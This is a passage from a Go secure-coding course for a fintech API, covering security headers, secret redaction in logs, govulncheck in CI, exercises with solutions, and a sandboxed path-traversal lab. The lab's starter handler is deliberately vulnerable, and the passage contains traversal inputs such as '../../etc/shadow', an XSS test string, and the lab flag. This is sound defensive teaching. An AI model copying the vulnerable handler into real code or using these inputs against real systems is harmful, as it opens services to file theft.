+```go
+package main
+
+import (
+	"fmt"
+	"net/http"
+	"net/http/httptest"
+)
+
+// SecurityHeaders adds the standard security headers to every response.
+func SecurityHeaders(next http.Handler) http.Handler {
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		h := w.Header()
+		h.Set("Strict-Transport-Security", "max-age=63072000; includeSubDomains")
+		h.Set("Content-Security-Policy", "default-src 'self'")
+		h.Set("X-Content-Type-Options", "nosniff")
+		h.Set("X-Frame-Options", "DENY")
+		h.Set("Referrer-Policy", "strict-origin-when-cross-origin")
+		next.ServeHTTP(w, r)
+	})
+}
+
+func main() {
+	handler := SecurityHeaders(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		fmt.Fprintln(w, "OK")
+	}))
+
+	req := httptest.NewRequest(http.MethodGet, "/", nil)
+	rr := httptest.NewRecorder()
+	handler.ServeHTTP(rr, req)
+
+	headers := []string{
+		"Strict-Transport-Security",
+		"Content-Security-Policy",
+		"X-Content-Type-Options",
+		"X-Frame-Options",
+		"Referrer-Policy",
+	}
+	for _, h := range headers {
+		fmt.Printf("%-35s %s\n", h+":", rr.Header().Get(h))
+	}
+}
+```
+
+</GoPlayground>
+
+## Secrets out of Logs
+
+This one sounds obvious. People still do it every day. Let me be vivid about why: a database connection string `postgres://app:S3cr3tP4ss@rds.amazonaws.com/ledger` written to a log file is a credential exposed to everyone with log-read access — and log storage is often far less locked down than secret storage. A JWT token in a log is a valid session credential until it expires. A customer's full credit card number in a log is a PCI violation.
+
+The controls:
+
+### Never log raw errors from sensitive operations
+
+```go
+// WRONG: err might contain the connection string, query parameters,
+// or other internal details that become visible in logs.
+if err != nil {
+	slog.Error("database error", "err", err)
+}
+
+// RIGHT: log a safe summary. Wrap the full error for observability
+// pipelines that handle it separately (e.g., Sentry, structured trace).
+if err != nil {
+	slog.Error("checkout failed", "tx_id", txID, "stage", "db_write")
+	// Return the wrapped error to the caller; do not surface it to
+	// the end user. The observability layer handles the full detail.
+	return fmt.Errorf("checkout db write: %w", err)
+}
+```
+
+### Redact secret types at the boundary
+
+Use a custom type with a `String()` method that never reveals the value. Configuration & Secrets Management covers this in depth; here's the pattern in brief:
+
+```go
+// Secret wraps a sensitive string. Its String() and LogValue()
+// methods always return "[REDACTED]" so the value never appears
+// in fmt output, slog output, or error messages.
+type Secret string
+
+func (s Secret) String() string { return "[REDACTED]" }
+
+// slog calls LogValue() if the value implements slog.LogValuer.
+func (s Secret) LogValue() slog.Value {
+	return slog.StringValue("[REDACTED]")
+}
+```
+
+Any struct field typed as `Secret` can be passed to `slog`, `fmt.Println`, or `fmt.Errorf` — it will always print `[REDACTED]`. This closes the "oops, I logged the whole config struct" footgun.
+
+<Callout kind="warn" title="Structured log fields, not format strings">
+
+`slog.Error("user login", "password", password)` puts the password in a structured field named `"password"` — some log processors will redact known-sensitive field names. `fmt.Sprintf("user %s logged in with password %s", user, password)` will not, because the structure is gone. Prefer `slog` with typed fields for everything that matters, and use the `Secret` type for values that must never appear in any output.
+
+</Callout>
+
+<GoPlayground>
+
+```go
+package main
+
+import (
+	"fmt"
+	"log/slog"
+	"os"
+)
+
+// Secret is a string type whose display methods always redact the value.
+type Secret string
+
+func (s Secret) String() string          { return "[REDACTED]" }
+func (s Secret) LogValue() slog.Value    { return slog.StringValue("[REDACTED]") }
+
+// Config holds application configuration including a database password.
+type Config struct {
+	DSN      Secret
+	AppName  string
+}
+
+func main() {
+	cfg := Config{
+		DSN:     Secret("postgres://app:hunter2@rds.internal/ledger"),
+		AppName: "ledger-api",
+	}
+
+	log := slog.New(slog.NewTextHandler(os.Stdout, nil))
+
+	// The Secret type prevents the DSN from appearing in any log output.
+	log.Info("service starting", "app", cfg.AppName, "dsn", cfg.DSN)
+
+	// Also safe with fmt — the Stringer is used automatically.
+	fmt.Printf("config: dsn=%v app=%s\n", cfg.DSN, cfg.AppName)
+}
+```
+
+</GoPlayground>
+
+## Supply-Chain Scanning
+
+<Define term="govulncheck (supply-chain scanning)" since="Tooling & Engineering Hygiene (Part 2)">
+**`govulncheck`** is the Go security team's official vulnerability scanner, backed by the Go vulnerability database at `vuln.go.dev`. Unlike dependency-list scanners that flag every module with any CVE regardless of call reachability, `govulncheck` performs **call-graph analysis**: it only reports vulnerabilities in functions your binary actually calls. A vulnerable function in a transitive dependency you never invoke is not reported — dramatically reducing noise. A flagged vulnerability includes the exact call chain that reaches the vulnerable code, the affected module version, and the fixed version. It belongs in CI as a hard gate: if it exits non-zero, the build fails and the vulnerable code does not ship.
+</Define>
+
+Your service is only as secure as its weakest dependency. A vulnerability in a Go module you import is a vulnerability in your binary. Go's official answer is `govulncheck`.
+
+### govulncheck
+
+`govulncheck` is maintained by the Go security team and backed by the Go vulnerability database at `vuln.go.dev`. Unlike a dependency-list scan that flags every package with any CVE, `govulncheck` performs **call-graph analysis** — it only reports vulnerabilities in code your binary actually calls. A vulnerable function in a dependency you import but don't call is not reported. This dramatically reduces noise.
+
+```
+go install golang.org/x/vuln/cmd/govulncheck@latest
+govulncheck ./...
+```
+
+Sample output when a vulnerability is found:
+
+```
+Vulnerability #1: GO-2024-2961
+    A crafted HTTP/2 CONTINUATION frame sequence can cause
+    net/http servers to stall.
+  More info: https://pkg.go.dev/vuln/GO-2024-2961
+  Module: golang.org/x/net
+    Found in: golang.org/x/net@v0.20.0
+    Fixed in: golang.org/x/net@v0.23.0
+    Example traces found:
+      #1: main.go:42:21: main.serveHTTP calls net/http.(*Server).ListenAndServeTLS
+```
+
+It tells you the module, the affected version, the fixed version, and — crucially — the call chain that reaches the vulnerable code. Run `go get golang.org/x/net@v0.23.0 && go mod tidy` and re-run `govulncheck` to confirm clean.
+
+### Wiring it into CI
+
+Add a step to your GitHub Actions workflow (or equivalent) so a known-vulnerable module fails the build rather than shipping:
+
+```yaml
+# .github/workflows/security.yml  (excerpt)
+- name: Install govulncheck
+  run: go install golang.org/x/vuln/cmd/govulncheck@latest
+
+- name: Run govulncheck
+  run: govulncheck ./...
+  # govulncheck exits non-zero if a called vulnerability is found.
+  # This fails the CI step, blocking the merge/deploy.
+```
+
+Pair it with `go mod verify` (checks that downloaded modules match their checksums in `go.sum`) and the `go.sum` file committed to the repository (so the build is reproducible and tamper-evident).
+
+<Callout kind="note" title="govulncheck vs. dependency list scanners">
+
+Tools like Snyk, Dependabot, and `nancy` scan your dependency graph and flag any module with a known CVE, regardless of whether your code actually calls the vulnerable function. This produces many false positives. `govulncheck` uses a binary/source call graph and only reports reachable vulnerabilities — far more actionable. Use `govulncheck` as your primary Go vulnerability gate; dependency scanners are a useful secondary layer for SBOMs and audit trails.
+
+</Callout>
+
+---
+
+## Exercises
+
+Stop admiring the theory. Ship the fix.
+
+<Exercise n={1} title="Strict JSON decoder" level="easy">
+
+Write an HTTP handler `BudgetHandler` that decodes a JSON body into a struct `BudgetRequest{AmountCents int, Category string}`. The handler must:
+1. Cap the body at 512 KB with `http.MaxBytesReader`.
+2. Reject unknown fields.
+3. Return 400 if `AmountCents` is not positive.
+
+<Solution>
+
+```go
+package main
+
+import (
+	"encoding/json"
+	"fmt"
+	"net/http"
+)
+
+type BudgetRequest struct {
+	AmountCents int    `json:"amount_cents"`
+	Category    string `json:"category"`
+}
+
+func BudgetHandler(w http.ResponseWriter, r *http.Request) {
+	r.Body = http.MaxBytesReader(w, r.Body, 512<<10)
+
+	dec := json.NewDecoder(r.Body)
+	dec.DisallowUnknownFields()
+
+	var req BudgetRequest
+	if err := dec.Decode(&req); err != nil {
+		http.Error(w, "bad request: "+err.Error(), http.StatusBadRequest)
+		return
+	}
+	if req.AmountCents <= 0 {
+		http.Error(w, "amount_cents must be positive", http.StatusBadRequest)
+		return
+	}
+	fmt.Fprintf(w, "accepted: %d cents for %s", req.AmountCents, req.Category)
+}
+
+func main() {
+	http.HandleFunc("/budget", BudgetHandler)
+	fmt.Println("listening on :8080")
+}
+```
+
+`DisallowUnknownFields` turns unknown JSON keys into a decode error rather than silently dropping them. `MaxBytesReader` prevents a large body from exhausting server memory.
+
+</Solution>
+
+</Exercise>
+
+<Exercise n={2} title="Safe filepath containment" level="medium">
+
+Write a function `SafeStatementPath(root, name string) (string, error)` that:
+1. Joins `root` and `name` with `filepath.Join`.
+2. Applies `filepath.Clean`.
+3. Returns an error if the cleaned path is not strictly inside `root` (not just a prefix match — it must be a child, not a sibling).
+4. Returns the clean path on success.
+
+Test it with `"../../etc/shadow"`, `"2024/jan.pdf"`, and `"../statements-archive/old.pdf"`.
+
+<Solution>
+
+```go
+package main
+
+import (
+	"errors"
+	"fmt"
+	"path/filepath"
+	"strings"
+)
+
+func SafeStatementPath(root, name string) (string, error) {
+	// Clean both so that a root without a trailing sep still works.
+	clean := filepath.Clean(filepath.Join(root, name))
+	// Use filepath.Separator to be platform-correct.
+	if !strings.HasPrefix(clean, filepath.Clean(root)+string(filepath.Separator)) {
+		return "", errors.New("path escapes root directory")
+	}
+	return clean, nil
+}
+
+func main() {
+	root := "/data/statements"
+	cases := []string{
+		"../../etc/shadow",
+		"2024/jan.pdf",
+		"../statements-archive/old.pdf",
+	}
+	for _, c := range cases {
+		path, err := SafeStatementPath(root, c)
+		if err != nil {
+			fmt.Printf("BLOCKED %q: %v\n", c, err)
+		} else {
+			fmt.Printf("ALLOWED: %s\n", path)
+		}
+	}
+}
+```
+
+The key detail: `filepath.Clean(root)+string(filepath.Separator)` normalizes the root *and* appends the separator before the prefix check, so a sibling directory sharing a name prefix can't slip through.
+
+</Solution>
+
+</Exercise>
+
+<Exercise n={3} title="html/template escaping demo" level="easy">
+
+Write a complete program that uses `html/template` to render the following HTML row template with a user-supplied description that contains a `<script>alert(1)</script>` payload. Print the rendered output to stdout and confirm the tag is escaped.
+
+Template: `<tr><td>{{.ID}}</td><td>{{.Desc}}</td></tr>`
+
+<Solution>
+
+```go
+package main
+
+import (
+	"html/template"
+	"os"
+)
+
+type Row struct {
+	ID   string
+	Desc string
+}
+
+func main() {
+	row := Row{
+		ID:   "tx_42",
+		Desc: `<script>alert(1)</script>`,
+	}
+
+	const tmpl = `<tr><td>{{.ID}}</td><td>{{.Desc}}</td></tr>`
+	t := template.Must(template.New("row").Parse(tmpl))
+	if err := t.Execute(os.Stdout, row); err != nil {
+		panic(err)
+	}
+}
+// Output:
+// <tr><td>tx_42</td><td>&lt;script&gt;alert(1)&lt;/script&gt;</td></tr>
+// The < and > are entities — the browser renders text, not a script.
+```
+
+Import `html/template`, not `text/template`. The output contains `&lt;script&gt;` — the angle brackets are HTML entities. The browser displays the text as-is and does not interpret it as a script tag.
+
+</Solution>
+
+</Exercise>
+
+<Exercise n={4} title="Security headers middleware" level="medium">
+
+Write a `SecurityHeaders` middleware (same signature as an `http.Handler` wrapper) that sets HSTS, CSP, `X-Content-Type-Options`, `X-Frame-Options`, and `Referrer-Policy`. Write a table-driven test using `httptest` that verifies all five headers are present with the correct values.
+
+<Solution>
+
+```go
+package main
+
+import (
+	"net/http"
+	"net/http/httptest"
+	"testing"
+)
+
+func SecurityHeaders(next http.Handler) http.Handler {
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		h := w.Header()
+		h.Set("Strict-Transport-Security", "max-age=63072000; includeSubDomains")
+		h.Set("Content-Security-Policy", "default-src 'self'")
+		h.Set("X-Content-Type-Options", "nosniff")
+		h.Set("X-Frame-Options", "DENY")
+		h.Set("Referrer-Policy", "strict-origin-when-cross-origin")
+		next.ServeHTTP(w, r)
+	})
+}
+
+func TestSecurityHeaders(t *testing.T) {
+	t.Parallel()
+	cases := []struct {
+		header string
+		want   string
+	}{
+		{"Strict-Transport-Security", "max-age=63072000; includeSubDomains"},
+		{"Content-Security-Policy", "default-src 'self'"},
+		{"X-Content-Type-Options", "nosniff"},
+		{"X-Frame-Options", "DENY"},
+		{"Referrer-Policy", "strict-origin-when-cross-origin"},
+	}
+
+	h := SecurityHeaders(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.WriteHeader(http.StatusOK)
+	}))
+	req := httptest.NewRequest(http.MethodGet, "/", nil)
+	rr := httptest.NewRecorder()
+	h.ServeHTTP(rr, req)
+
+	for _, tc := range cases {
+		t.Run(tc.header, func(t *testing.T) {
+			if got := rr.Header().Get(tc.header); got != tc.want {
+				t.Errorf("%s: got %q, want %q", tc.header, got, tc.want)
+			}
+		})
+	}
+}
+```
+
+Table-driven tests with `t.Parallel` on the outer test. Each subtest checks one header. The `httptest.NewRecorder` captures the response headers without a live server.
+
+</Solution>
+
+</Exercise>
+
+<Exercise n={5} title="Secret type with slog redaction" level="hard">
+
+Implement a `Secret` type (a named string) with:
+1. A `String() string` method that returns `"[REDACTED]"`.
+2. A `LogValue() slog.Value` method that satisfies `slog.LogValuer` and returns `slog.StringValue("[REDACTED]")`.
+
+Write a test that verifies:
+- `fmt.Sprintf("%v", Secret("hunter2"))` returns `"[REDACTED]"`.
+- A `slog.TextHandler` writing to a buffer does not contain `"hunter2"` when the Secret is logged as a structured field.
+
+<Solution>
+
+```go
+package main
+
+import (
+	"bytes"
+	"fmt"
+	"log/slog"
+	"strings"
+	"testing"
+)
+
+// Secret is a named string type whose display methods always redact.
+type Secret string
+
+func (s Secret) String() string       { return "[REDACTED]" }
+func (s Secret) LogValue() slog.Value { return slog.StringValue("[REDACTED]") }
+
+func TestSecretRedaction(t *testing.T) {
+	t.Parallel()
+	s := Secret("hunter2")
+
+	// 1. fmt.Sprintf uses the String() method.
+	if got := fmt.Sprintf("%v", s); got != "[REDACTED]" {
+		t.Errorf("fmt.Sprintf: got %q, want [REDACTED]", got)
+	}
+
+	// 2. slog uses LogValue() for structured fields.
+	var buf bytes.Buffer
+	logger := slog.New(slog.NewTextHandler(&buf, nil))
+	logger.Info("login attempt", "password", s)
+
+	if strings.Contains(buf.String(), "hunter2") {
+		t.Errorf("log output contains the secret: %s", buf.String())
+	}
+	if !strings.Contains(buf.String(), "[REDACTED]") {
+		t.Errorf("log output does not contain [REDACTED]: %s", buf.String())
+	}
+}
+
+func main() {
+	s := Secret("hunter2")
+	fmt.Println(s) // [REDACTED]
+}
+```
+
+`slog.LogValuer` is the interface the structured logger checks before formatting a value. Implementing it on `Secret` means the raw value never enters the log even when a caller passes the whole struct to `slog.Info`.
+
+</Solution>
+
+</Exercise>
+
+---
+
+## The Lab
+
+Listen up, sport. You've had the theory. You've done the drills. Now I'm going to personally put you in the room with a *live, broken service* and see what you're actually made of.
+
+The ledger API's receipt-viewer handler is vulnerable to path traversal. A deliberate weakness — a test target running *only inside this sandbox*, isolated from everything real. Your mission in two acts:
+
+1. **Break it.** Craft a request that escapes the receipts directory and reads a file outside it. When you succeed, the handler echoes back the file contents — that string is the flag.
+2. **Fix it.** Patch the handler so the same request returns 403 and a regression test (`TestTraversalBlocked`) passes, confirming the exploit no longer works.
+
+The verifier runs `TestTraversalBlocked`. When that test passes and the exploit request returns 403, the flag is yours. This is a fully sandboxed target. There is nothing real to damage. Go.
+
+<Lab
+  title="Path Traversal: Break It, Then Fix It"
+  archetype="break-fix"
+  difficulty="guided"
+  points={80}
+  hintCost={10}
+  objective="The starter handler serves receipts from /sandbox/receipts/ but does not enforce containment. Step 1: send a request with a filename like ../../secret.txt to read outside the directory and capture the flag string it returns. Step 2: patch the handler so filepath.Clean + HasPrefix containment blocks the traversal, and make TestTraversalBlocked pass."
+  starter={`package main
+
+import (
+	"fmt"
+	"net/http"
+	"net/http/httptest"
+	"os"
+	"path/filepath"
+	"strings"
+	"testing"
+)
+
+// ReceiptHandler serves files from a receipts root.
+// BUG: it does not enforce containment — path traversal is possible.
+func ReceiptHandler(root string) http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
+		name := r.URL.Query().Get("file")
+		// TODO: apply filepath.Clean and a HasPrefix containment check.
+		// Right now the path is used as-is after a bare Join.
+		path := filepath.Join(root, name)
+		data, err := os.ReadFile(path)
+		if err != nil {
+			http.Error(w, "not found", http.StatusNotFound)
+			return
+		}
+		fmt.Fprint(w, string(data))
+	}
+}
+
+// TestTraversalBlocked must pass after you fix ReceiptHandler.
+// Do not modify this test.
+func TestTraversalBlocked(t *testing.T) {
+	root := t.TempDir()
+	// Create the receipts subdirectory and a safe file inside it.
+	receiptsDir := filepath.Join(root, "receipts")
+	os.MkdirAll(receiptsDir, 0o755)
+	os.WriteFile(filepath.Join(receiptsDir, "inv001.pdf"), []byte("invoice data"), 0o644)
+	// Create a secret file one level above receipts.
+	os.WriteFile(filepath.Join(root, "secret.txt"), []byte("GO{traversal_contained_clean_and_check}"), 0o644)
+
+	h := ReceiptHandler(receiptsDir)
+
+	// The traversal attempt must return 403.
+	req := httptest.NewRequest(http.MethodGet, "/?file=../secret.txt", nil)
+	rr := httptest.NewRecorder()
+	h.ServeHTTP(rr, req)
+	if rr.Code != http.StatusForbidden {
+		t.Errorf("traversal: got status %d, want 403", rr.Code)
+	}
+	if strings.Contains(rr.Body.String(), "GO{") {
+		t.Error("traversal: response body contains the flag — containment failed")
+	}
+
+	// A legitimate file must still be served.
+	req2 := httptest.NewRequest(http.MethodGet, "/?file=inv001.pdf", nil)
+	rr2 := httptest.NewRecorder()
+	h.ServeHTTP(rr2, req2)
+	if rr2.Code != http.StatusOK {
+		t.Errorf("legit file: got status %d, want 200", rr2.Code)
+	}
+}`}
+  verifier="TestTraversalBlocked passes (traversal returns 403, flag string absent from response, legitimate file still served 200). The verifier runs go test -run TestTraversalBlocked ./... and checks exit code 0."
+  hints={[
+    "Step 1 (exploit): before fixing anything, send a request with file=../secret.txt and read the response body. That is the flag string.",
+    "Step 2 (fix): after filepath.Join(root, name), call filepath.Clean on the result. Then check that the cleaned path starts with filepath.Clean(root)+string(filepath.Separator). If not, return http.StatusForbidden.",
+    "The legitimate file test (inv001.pdf) must still return 200 after your fix — make sure your containment check allows paths that are genuinely inside the root directory."
+  ]}
+  flag="GO{traversal_contained_clean_and_check}"
+>
+
+The vulnerable handler is the target. The sandbox file tree is entirely fake. Exploit it to see the flag, then patch it so the exploit fails and `TestTraversalBlocked` goes green.
+
+</Lab>
+
+<Recap>
+
+- **Input is hostile.** Use `http.MaxBytesReader` + `dec.DisallowUnknownFields()` for every JSON endpoint. Validate at the boundary with allow-lists, normalize before you validate.
+- **SQL injection** is closed by parameterized queries — never `fmt.Sprintf` into a query string. The databases chapter gave you this; here it's a security control.
+- **Command injection** is closed by `exec.Command(binary, arg1, arg2)` — never a shell string with user input.
+- **Path traversal** is closed by `filepath.Clean` + `strings.HasPrefix(clean, root+"/")`. Both steps are required; neither is sufficient alone.
+- **SSRF** requires a custom `net.Dialer` with a `Control` hook that validates the resolved IP against a blocklist (or better, an allow-list) after DNS resolution.
+- **XSS** in server-rendered HTML is closed by `html/template` (never `text/template`). It context-escapes automatically. `template.HTML` bypasses all of that — only use it for HTML you generated yourself.
+- **Security headers** — HSTS, CSP, `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy` — belong on every response. Wire them in middleware, not per-handler.
+- **Secrets and PII never appear in logs.** Use a `Secret` type with `String()` and `LogValue()` redaction. Log structured fields, not format strings.
+- **`govulncheck`** runs call-graph analysis against the Go vulnerability database and only reports reachable vulnerabilities. It belongs in CI as a hard gate.
+
+</Recap>
+
+<Scoreboard
+  streak={12}
+  items={[
+    { label: "Quick check — allow-lists vs deny-lists", kind: "quiz", points: 10, done: false },
+    { label: "Quick check — filepath.Clean trailing slash", kind: "quiz", points: 10, done: false },
+    { label: "Quick check — template.HTML bypass", kind: "quiz", points: 10, done: false },
+    { label: "Exercise 1 — Strict JSON decoder", kind: "exercise", points: 10, done: false },
+    { label: "Exercise 2 — Safe filepath containment", kind: "exercise", points: 15, done: false },
+    { label: "Exercise 3 — html/template escaping demo", kind: "exercise", points: 10, done: false },
+    { label: "Exercise 4 — Security headers middleware", kind: "exercise", points: 15, done: false },
+    { label: "Exercise 5 — Secret type with slog redaction", kind: "exercise", points: 20, done: false }
+  ]}
+  flag={{ label: "Lab — Path Traversal: Break It, Then Fix It", captured: false, points: 80 }}
+/>
+
+Not bad. Genuinely — for a human. You've just hardened the foundation every service you ever build now stands on. The controls here aren't impressive. They're *expected*. Missing any of them isn't a gap in your security posture; it's a gap in your professionalism, and I take that personally.
+
+Part 3 is where we layer the fintech-specific controls on top: secrets management, encryption at rest, signing requests, replay protection, and the full weight of handling real money carefully. You've earned it. Onward, sport.
